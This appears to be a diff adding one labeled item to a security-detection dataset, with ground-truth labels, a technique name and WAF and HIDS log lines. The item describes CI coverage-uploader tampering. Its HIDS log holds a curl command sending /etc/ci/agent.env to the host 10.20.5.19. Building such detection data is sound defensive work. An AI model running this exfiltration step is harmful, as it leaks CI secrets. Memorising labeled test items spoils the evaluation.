@@ -1,0 +1,33 @@
+{
+ "unit": 1131,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "CI 覆盖率上传脚本篡改（uploader 端点改指攻击者主机）",
+ "sources": [
+  "waf",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-30 06:30:23",
+   "source": "waf",
+   "log_id": "WAF0606105",
+   "content": "/api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma",
+   "event_id": "1131-WAF0606105"
+  },
+  {
+   "timestamp": "2026-07-30 06:31:51",
+   "source": "hids",
+   "log_id": "HID0656849",
+   "content": "curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa",
+   "event_id": "1131-HID0656849"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
